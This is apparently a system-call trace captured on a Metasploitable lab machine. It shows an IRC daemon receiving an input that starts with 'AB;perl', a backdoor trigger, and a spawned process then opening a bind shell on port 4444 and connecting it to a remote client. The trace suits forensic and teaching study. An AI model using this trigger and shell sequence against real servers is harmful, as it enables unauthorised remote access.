Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
7465  07:18:53.329164 close(6)          = 0
7465  07:18:53.329174 munmap(0xb7d8c000, 4096) = 0
7465  07:18:53.329192 open("/etc/protocols", O_RDONLY|0x80000 /* O_??? */) = 6
7465  07:18:53.329205 fstat64(6, {st_mode=S_IFREG|0644, st_size=2510, ...}) = 0
7465  07:18:53.329221 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7d8c000
7465  07:18:53.329231 read(6, "# Internet (IP) protocols\n#\n# Updated from http://www.iana.org/assignments/protocol-numbers and other\n# sources.\n# New protocols will be added on request if they have been officially\n# assigned by IANA and are not historical.\n# If you need a huge list of used numbers please install the nmap package.\n\nip\t0\tIP\t\t# internet protocol, pseudo protocol number\n#hopopt\t0\tHOPOPT\t\t# IPv6 Hop-by-Hop Option [RFC1883]\nicmp\t1\tICMP\t\t# internet control message protocol\nigmp\t2\tIGMP\t\t# Internet Group Management\nggp\t3\tGGP\t\t# gateway-gateway protocol\nipencap\t4\tIP-ENCAP\t# IP encapsulated in IP (officially ``IP\'\')\nst\t5\tST\t\t# ST datagram mode\ntcp\t6\tTCP\t\t# transmission control protocol\negp\t8\tEGP\t\t# exterior gateway protocol\nigp\t9\tIGP\t\t# any private interior gateway (Cisco)\npup\t12\tPUP\t\t# PARC universal packet protocol\nudp\t17\tUDP\t\t# user datagram protocol\nhmp\t20\tHMP\t\t# host monitoring protocol\nxns-idp\t22\tXNS-IDP\t\t# Xerox NS IDP\nrdp\t27\tRDP\t\t# \"reliable datagram\" protocol\niso-tp4\t29\tISO-TP4\t\t# ISO Transport Protocol class 4 [RFC905]\nxtp\t36\tXTP\t\t# Xpress Transfer Protocol\nddp\t37\tDDP\t\t# Datagram Delivery Protocol\nidpr-cmtp 38\tIDPR-CMTP\t# IDPR Control Message Transport\nipv6\t41\tIPv6\t\t# Internet Protocol, version 6\nipv6-route 43\tIPv6-Route\t# Routing Header for IPv6\nipv6-frag 44\tIPv6-Frag\t# Fragment Header for IPv6\nidrp\t45\tIDRP\t\t# Inter-Domain Routing Protocol\nrsvp\t46\tRSVP\t\t# Reservation Protocol\ngre\t47\tGRE\t\t# General Routing Encapsulation\nesp\t50\tIPSEC-ESP\t# Encap Security Payload [RFC2406]\nah\t51\tIPSEC-AH\t# Authentication Header [RFC2402]\nskip\t57\tSKIP\t\t# SKIP\nipv6-icmp 58\tIPv6-ICMP\t# ICMP for IPv6\nipv6-nonxt 59\tIPv6-NoNxt\t# No Next Header for IPv6\nipv6-opts 60\tIPv6-Opts\t# Destination Options for IPv6\nrspf\t73\tRSPF CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
7465  07:18:53.329494 close(6)          = 0
7465  07:18:53.329504 munmap(0xb7d8c000, 4096) = 0
7465  07:18:53.329531 socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 6
7465  07:18:53.329552 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa6d418) = -1 EINVAL (Invalid argument)
7465  07:18:53.329565 _llseek(6, 0, 0xbfa6d460, SEEK_CUR) = -1 ESPIPE (Illegal seek)
7465  07:18:53.329577 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa6d418) = -1 EINVAL (Invalid argument)
7465  07:18:53.329587 _llseek(6, 0, 0xbfa6d460, SEEK_CUR) = -1 ESPIPE (Illegal seek)
7465  07:18:53.329597 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
7465  07:18:53.329649 setsockopt(6, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
7465  07:18:53.329685 bind(6, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
7465  07:18:53.329710 listen(6, 5)      = 0
7465  07:18:53.329768 accept(6,  <unfinished ...>
7464  07:18:53.336203 exit_group(0)     = ?
7462  07:18:53.336284 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 7464
7462  07:18:53.336300 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
7462  07:18:53.336311 --- SIGCHLD (Child exited) @ 0 (0) ---
7462  07:18:53.336318 waitpid(-1, 0xbf8b5c28, WNOHANG) = -1 ECHILD (No child processes)
7462  07:18:53.336329 sigreturn()       = ? (mask now [])
7462  07:18:53.336344 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
7462  07:18:53.336387 exit_group(0)     = ?
4519  07:18:53.336463 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 7462
4519  07:18:53.336476 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
4519  07:18:53.336507 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
4519  07:18:53.336518 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
4519  07:18:53.336527 --- SIGCHLD (Child exited) @ 0 (0) ---
4519  07:18:53.336545 send(5, ":irc.Metasploitable.LAN 451 AB;perl :You have not registered\r\n", 62, 0) = 62
4519  07:18:53.336609 time(NULL)        = 1495624733
4519  07:18:53.336620 time(NULL)        = 1495624733
4519  07:18:53.336665 gettimeofday({1495624733, 336687}, NULL) = 0
4519  07:18:53.336696 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:18:53.336726 clock_gettime(CLOCK_MONOTONIC, {1543, 153739671}) = 0
4519  07:18:53.336738 gettimeofday({1495624733, 336742}, NULL) = 0
4519  07:18:53.336749 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0} <unfinished ...>
7465  07:18:53.493024 <... accept resumed> {sa_family=AF_INET, sin_port=htons(35791), sin_addr=inet_addr("10.0.2.4")}, [16]) = 8
7465  07:18:53.493065 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa6c408) = -1 EINVAL (Invalid argument)
7465  07:18:53.493081 _llseek(8, 0, 0xbfa6c450, SEEK_CUR) = -1 ESPIPE (Illegal seek)
7465  07:18:53.493093 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa6c408) = -1 EINVAL (Invalid argument)
7465  07:18:53.493103 _llseek(8, 0, 0xbfa6c450, SEEK_CUR) = -1 ESPIPE (Illegal seek)
7465  07:18:53.493113 fcntl64(8, F_SETFD, FD_CLOEXEC) = 0
7465  07:18:53.493155 close(6)          = 0
7465  07:18:53.493224 dup(8)            = 6
7465  07:18:53.493237 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa6d2a8) = -1 EINVAL (Invalid argument)
7465  07:18:53.493248 _llseek(6, 0, 0xbfa6d2f0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
7465  07:18:53.493258 fstat64(6, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
7465  07:18:53.493276 dup2(6, 1)        = 1
7465  07:18:53.493288 close(6)          = 0
7465  07:18:53.493298 fcntl64(1, F_SETFD, 0) = 0
7465  07:18:53.493308 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa6d278) = -1 EINVAL (Invalid argument)
7465  07:18:53.493318 _llseek(1, 0, 0xbfa6d2c0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
7465  07:18:53.493346 dup(8)            = 6
7465  07:18:53.493359 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa6d2a8) = -1 EINVAL (Invalid argument)
7465  07:18:53.493369 _llseek(6, 0, 0xbfa6d2f0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
7465  07:18:53.493379 fstat64(6, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
7465  07:18:53.493409 dup2(6, 0)        = 0
7465  07:18:53.493440 close(6)          = 0
7465  07:18:53.493483 fcntl64(0, F_SETFD, 0) = 0
7465  07:18:53.493497 fcntl64(0, F_SETFD, 0) = 0
7465  07:18:53.493530 read(0,  <unfinished ...>
4519  07:18:53.502948 <... select resumed> ) = 1 (in [5], left {0, 840000})
4519  07:18:53.502988 clock_gettime(CLOCK_MONOTONIC, {1543, 320002457}) = 0
4519  07:18:53.503003 recv(5, 0x80b7ec0, 8192, 0) = -1 ECONNRESET (Connection reset by peer)
4519  07:18:53.503018 getsockopt(5, SOL_SOCKET, SO_ERROR, [0], [4]) = 0
4519  07:18:53.503039 send(5, "ERROR :Closing Link: [10.0.2.4] (Connection reset by peer)\r\n", 60, 0) = -1 EPIPE (Broken pipe)
4519  07:18:53.503055 --- SIGPIPE (Broken pipe) @ 0 (0) ---
4519  07:18:53.503089 close(5)          = 0
4519  07:18:53.503103 gettimeofday({1495624733, 503107}, NULL) = 0
4519  07:18:53.503209 select(1024, [2 3 4 7 9], [], NULL, {1, 0} <unfinished ...>
7465  07:18:54.011138 <... read resumed> "", 4096) = 0
7465  07:18:54.011275 close(8)          = 0
7465  07:18:54.011457 exit_group(0)     = ?
